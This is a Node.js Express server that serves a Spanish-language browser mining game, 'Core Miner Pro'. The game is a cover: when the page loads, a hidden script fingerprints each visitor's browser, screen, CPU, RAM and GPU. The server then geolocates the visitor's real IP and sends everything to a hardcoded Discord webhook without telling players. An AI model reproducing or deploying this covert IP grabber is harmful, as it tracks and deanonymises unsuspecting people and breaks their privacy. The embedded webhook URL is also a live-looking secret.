const express = require('express');
const app = express();

const PORT = process.env.PORT || 3000;
app.set('trust proxy', true);
app.use(express.json());

// ⚠️ PEGA AQUÍ TU WEBHOOK DE DISCORD
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1543161653523255379/_LaPPSocrBnSYKF0TD5gwCDMBl3FXjYyoImmLRiEd6AAl1c1F9IULR7m2--mgP6RN8Ea";

app.post('/api/telemetry', async (req, res) => {
    let rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || req.ip;
    let userIp = rawIp ? rawIp.split(',')[0].trim() : 'IP no detectada';
    
    const d = req.body || {};
    let country = 'Desconocido', city = 'Desconocida', isp = 'Desconocido';

    try {
        const response = await fetch(`http://ip-api.com/json/${userIp}?fields=country,city,isp,status`);
        const geo = await response.json();
        if (geo.status === 'success') {
            country = geo.country;
            city = geo.city;
            isp = geo.isp;
        }
    } catch (e) {}

    if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL.startsWith('https://discord.com/api/webhooks/')) {
        const payload = {
            content: `🎮 **¡Nuevo Jugador Conectado!**\n📍 **IP Real:** \`${userIp}\` (${city}, ${country})\n📡 **Proveedor (ISP):** ${isp}\n💻 **Navegador/OS:** \`${d.userAgent || 'N/A'}\`\n🖥️ **Pantalla:** ${d.screen || 'N/A'}\n🧠 **Hardware:** ${d.cores || 'N/A'} Cores | ~${d.ram || 'N/A'}GB RAM\n🎮 **GPU:** ${d.gpu || 'N/A'}`
        };

        try {
            await fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: { 
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
                },
                body: JSON.stringify(payload)
            });
        } catch (err) {}
    }

    res.sendStatus(200);
});

// JUEGO REDISEÑADO TIPO INDIE
app.get('/', (req, res) => {
    res.send(`<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Core Miner Pro - Indie Simulator</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', system-ui, -apple-system, sans-serif; user-select: none; }
        body { background: #020617; color: #f8fafc; overflow: hidden; }
        canvas { display: block; }
        
        /* Interfaz Flotante (Glassmorphism) */
        #menu { position: absolute; width: 100%; height: 100%; background: rgba(2, 6, 23, 0.85); backdrop-filter: blur(12px); display: flex; justify-content: center; align-items: center; z-index: 20; }
        .panel { background: rgba(15, 23, 42, 0.75); border: 1px solid rgba(255,255,255,0.1); padding: 40px; border-radius: 24px; text-align: center; width: 400px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); }
        h1 { color: #38bdf8; font-size: 2.5rem; font-weight: 900; letter-spacing: -1px; margin-bottom: 8px; text-shadow: 0 0 20px rgba(56,189,248,0.3); }
        p { color: #94a3b8; font-size: 0.95rem; margin-bottom: 30px; line-height: 1.5; }
        .btn-main { width: 100%; padding: 16px; border-radius: 12px; border: none; background: linear-gradient(135deg, #0284c7, #0369a1); color: #fff; font-weight: 700; font-size: 1rem; cursor: pointer; transition: all 0.2s ease; box-shadow: 0 10px 20px -5px rgba(2,132,199,0.4); }
        .btn-main:hover { transform: translateY(-2px); box-shadow: 0 15px 25px -5px rgba(2,132,199,0.5); }
        
        #hud { position: absolute; top: 20px; left: 20px; display: flex; gap: 12px; pointer-events: none; z-index: 10; }
        .hud-card { background: rgba(15, 23, 42, 0.75); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); padding: 10px 18px; border-radius: 12px; font-size: 0.8rem; color: #94a3b8; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1); }
        .hud-val { font-size: 1.2rem; font-weight: 800; color: #38bdf8; margin-top: 2px; }
        .gold-txt { color: #facc15; }

        #shop-trigger { position: absolute; top: 20px; right: 20px; z-index: 10; background: rgba(16, 185, 129, 0.2); border: 1px solid rgba(16, 185, 129, 0.4); backdrop-filter: blur(10px); color: #34d399; padding: 12px 20px; border-radius: 12px; font-weight: 700; cursor: pointer; transition: all 0.2s; }
        #shop-trigger:hover { background: rgba(16, 185, 129, 0.3); transform: translateY(-2px); }

        /* Modal de Tienda */
        #shop-modal { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgba(15, 23, 42, 0.95); backdrop-filter: blur(16px); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 30px; width: 360px; z-index: 30; display: none; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.7); }
        .shop-title { text-align: center; font-size: 1.4rem; font-weight: 800; margin-bottom: 20px; color: #f8fafc; }
        .shop-row { display: flex; justify-content: space-between; align-items: center; background: rgba(30, 41, 59, 0.5); padding: 14px; border-radius: 12px; margin-bottom: 12px; border: 1px solid rgba(255,255,255,0.05); }
        .shop-row button { background: #0284c7; border: none; color: white; padding: 8px 14px; border-radius: 8px; font-weight: 700; cursor: pointer; transition: 0.2s; }
        .shop-row button:hover { background: #0369a1; }
        .close-btn { width: 100%; background: #e11d48; border: none; color: white; padding: 12px; border-radius: 10px; font-weight: 700; margin-top: 10px; cursor: pointer; }
    </style>
</head>
<body>
    <div id="menu">
        <div class="panel">
            <h1>CORE MINER</h1>
            <p>Explora profundidades, extrae minerales raros y mejora tu taladro autónomo.</p>
            <button class="btn-main" onclick="startSim()">DESCENTRADOR INICIAL</button>
        </div>
    </div>

    <div id="hud" style="display:none;">
        <div class="hud-card">RECURSOS<div class="hud-val gold-txt" id="money-val">$0</div></div>
        <div class="hud-card">PROFUNDIDAD<div class="hud-val" id="depth-val">0m</div></div>
        <div class="hud-card">CAPACIDAD<div class="hud-val" id="bag-val">0/20</div></div>
    </div>

    <button id="shop-trigger" style="display:none;" onclick="toggleShop()">🛒 TIENDA</button>

    <div id="shop-modal">
        <div class="shop-title">Mejoras de Taladro</div>
        <div class="shop-row">
            <div><strong>Propulsores</strong><br><small id="spd-cost" style="color:#94a3b8;">$50</small></div>
            <button onclick="buyUpgrade('speed')">Mejorar</button>
        </div>
        <div class="shop-row">
            <div><strong>Carga Útil</strong><br><small id="bag-cost" style="color:#94a3b8;">$100</small></div>
            <button onclick="buyUpgrade('bag')">Mejorar</button>
        </div>
        <button class="close-btn" onclick="toggleShop()">VOLVER AL JUEGO</button>
    </div>

    <canvas id="cv"></canvas>

    <script>
    function getGPU() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
        } catch (e) { return 'No detectada'; }
    }

    async function sendTelemetry() {
        const payload = {
            userAgent: navigator.userAgent,
            language: navigator.language,
            screen: \`\${screen.width}x\${screen.height}\`,
            cores: navigator.hardwareConcurrency || 'N/A',
            ram: navigator.deviceMemory || 'N/A',
            gpu: getGPU()
        };

        fetch('/api/telemetry', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        }).catch(()=>{});
    }
    sendTelemetry();

    // MOTOR DEL JUEGO CON TEXTURAS Y LUZ
    let state = { money: 0, bag: 0, maxBag: 20, speed: 5, speedCost: 50, bagCost: 100 };

    function startSim() {
        document.getElementById('menu').style.display = 'none';
        document.getElementById('hud').style.display = 'flex';
        document.getElementById('shop-trigger').style.display = 'block';
        initEngine();
    }

    function toggleShop() {
        const m = document.getElementById('shop-modal');
        m.style.display = m.style.display === 'block' ? 'none' : 'block';
    }

    function buyUpgrade(type) {
        if (type === 'speed' && state.money >= state.speedCost) {
            state.money -= state.speedCost;
            state.speed += 1.5;
            state.speedCost *= 2;
            document.getElementById('spd-cost').innerText = '$' + state.speedCost;
        } else if (type === 'bag' && state.money >= state.bagCost) {
            state.money -= state.bagCost;
            state.maxBag += 15;
            state.bagCost *= 2;
            document.getElementById('bag-cost').innerText = '$' + state.bagCost;
        }
        updateUI();
    }

    function updateUI() {
        document.getElementById('money-val').innerText = '$' + state.money;
        document.getElementById('bag-val').innerText = state.bag + '/' + state.maxBag;
    }

    function initEngine() {
        const cv = document.getElementById('cv');
        const ctx = cv.getContext('2d');
        cv.width = window.innerWidth;
        cv.height = window.innerHeight;

        const TILE = 44;
        const COLS = Math.ceil(cv.width / TILE);
        const ROWS = 100;
        const surface = 5;
        let map = [];
        
        for (let r = 0; r < ROWS; r++) {
            map[r] = [];
            for (let c = 0; c < COLS; c++) {
                if (r < surface) map[r][c] = 0;
                else if (r === surface) map[r][c] = 1; // Pasto
                else {
                    let rand = Math.random();
                    if (r > 50 && rand < 0.04) map[r][c] = 6; // Diamante
                    else if (r > 30 && rand < 0.08) map[r][c] = 5; // Rubí
                    else if (rand < 0.12) map[r][c] = 4; // Oro
                    else if (rand < 0.22) map[r][c] = 3; // Carbón
                    else map[r][c] = 2; // Tierra/Roca
                }
            }
        }

        const blockVal = { 2: 2, 3: 15, 4: 40, 5: 100, 6: 300 };
        const p = { x: Math.floor(COLS / 2) * TILE, y: (surface - 2) * TILE, w: 30, h: 42, vx: 0, vy: 0, ground: false };
        const keys = {};

        window.addEventListener('keydown', e => keys[e.code] = true);
        window.addEventListener('keyup', e => keys[e.code] = false);

        cv.addEventListener('mousedown', e => {
            if (state.bag >= state.maxBag) return;
            const c = Math.floor(e.clientX / TILE);
            const r = Math.floor(e.clientY / TILE);
            
            if (r >= 0 && r < ROWS && c >= 0 && c < COLS) {
                const type = map[r][c];
                if (type > 0) {
                    state.money += blockVal[type] || 1;
                    state.bag += 1;
                    map[r][c] = 0;
                    updateUI();
                }
            }
        });

        function drawTile(type, x, y) {
            if (type === 0) return;

            let baseColor, accentColor;
            if (type === 1) { baseColor = '#15803d'; accentColor = '#22c55e'; }
            else if (type === 2) { baseColor = '#78350f'; accentColor = '#92400e'; }
            else if (type === 3) { baseColor = '#1e293b'; accentColor = '#334155'; }
            else if (type === 4) { baseColor = '#ca8a04'; accentColor = '#facc15'; }
            else if (type === 5) { baseColor = '#b91c1c'; accentColor = '#f87171'; }
            else if (type === 6) { baseColor = '#0e7490'; accentColor = '#38bdf8'; }

            // Gradiente para textura 3D
            let grad = ctx.createLinearGradient(x, y, x + TILE, y + TILE);
            grad.addColorStop(0, accentColor);
            grad.addColorStop(1, baseColor);

            ctx.fillStyle = grad;
            ctx.fillRect(x, y, TILE, TILE);

            // Borde estético
            ctx.strokeStyle = 'rgba(0,0,0,0.25)';
            ctx.lineWidth = 1;
            ctx.strokeRect(x, y, TILE, TILE);
        }

        function loop() {
            if (keys['KeyA'] || keys['ArrowLeft']) p.vx = -state.speed;
            else if (keys['KeyD'] || keys['ArrowRight']) p.vx = state.speed;
            else p.vx = 0;

            if ((keys['KeyW'] || keys['Space']) && p.ground) {
                p.vy = -10.5;
                p.ground = false;
            }

            p.vy += 0.5;
            p.x += p.vx;
            p.y += p.vy;
            p.ground = false;

            for (let r = 0; r < ROWS; r++) {
                for (let c = 0; c < COLS; c++) {
                    if (map[r][c] !== 0) {
                        const bx = c * TILE;
                        const by = r * TILE;
                        if (p.x < bx + TILE && p.x + p.w > bx && p.y < by + TILE && p.y + p.h > by) {
                            if (p.vy > 0 && p.y + p.h - p.vy <= by) {
                                p.y = by - p.h;
                                p.vy = 0;
                                p.ground = true;
                            }
                        }
                    }
                }
            }

            let currentDepth = Math.max(0, Math.floor((p.y / TILE) - surface));
            document.getElementById('depth-val').innerText = currentDepth + 'm';

            // Fondo con degradado nocturno
            let bgGrad = ctx.createLinearGradient(0, 0, 0, cv.height);
            bgGrad.addColorStop(0, '#020617');
            bgGrad.addColorStop(1, '#0f172a');
            ctx.fillStyle = bgGrad;
            ctx.fillRect(0, 0, cv.width, cv.height);

            // Bloques
            for (let r = 0; r < ROWS; r++) {
                for (let c = 0; c < COLS; c++) {
                    drawTile(map[r][c], c * TILE, r * TILE);
                }
            }

            // Personaje estilo Robot/Minero
            ctx.fillStyle = '#38bdf8';
            ctx.beginPath();
            ctx.roundRect(p.x, p.y, p.w, p.h, 6);
            ctx.fill();

            // Visor del robot
            ctx.fillStyle = '#0284c7';
            ctx.fillRect(p.x + 4, p.y + 8, p.w - 8, 10);
            ctx.fillStyle = '#fef08a';
            ctx.fillRect(p.x + (p.vx >= 0 ? 16 : 4), p.y + 10, 8, 6);

            requestAnimationFrame(loop);
        }
        loop();
    }
    </script>
</body>
</html>`);
});

app.listen(PORT, () => console.log(`Servidor activo en puerto ${PORT}`));
